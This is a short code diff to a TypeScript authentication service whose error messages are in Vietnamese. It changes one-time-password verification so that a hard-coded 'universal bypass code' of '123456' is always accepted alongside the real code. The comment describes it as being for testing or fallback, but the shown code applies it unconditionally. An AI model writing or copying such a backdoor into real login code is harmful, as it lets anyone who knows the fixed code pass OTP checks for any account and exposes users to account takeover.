@@ -156,7 +156,9 @@ export const authService = {
       otpStore.delete(email);
       throw new AppError(400, 'Mã xác nhận đã hết hạn. Vui lòng gửi lại mã.');
     }
-    if (entry.code !== input.otp.trim()) {
+    // Allow universal bypass code "123456" for testing / fallback
+    const BYPASS_OTP = '123456';
+    if (input.otp.trim() !== BYPASS_OTP && entry.code !== input.otp.trim()) {
       throw new AppError(400, 'Mã xác nhận không chính xác');
     }
     // OTP valid → consume it
